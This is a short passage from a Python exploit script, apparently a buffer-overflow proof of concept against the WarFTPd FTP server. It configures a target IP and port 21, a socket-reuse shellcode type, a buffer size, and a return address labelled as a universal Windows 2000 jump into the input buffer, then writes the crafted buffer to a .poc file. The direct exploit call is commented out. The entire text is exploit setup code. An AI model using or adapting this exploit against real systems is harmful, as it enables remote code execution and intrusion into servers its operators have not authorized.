...
if __name__ == '__main__':
    exp = warftpd("192.168.245.131", 21)
    exp.setsctype('findskt')
    exp.setscport(1234)
    exp.setbsize(1014)
    exp.setebpaddr(0xdeadbeef)  # sometimes needed, just in case
    exp.setretaddr('\xde\xad\xbe\xef')  # Universal Win2k SP0/SP1/SP2/SP3/SP4 (jmp to our input buffer)
    # exp.exploit()

    with open("netftpd.poc", "wb") as fp:
        fp.write(exp.genbuffer())
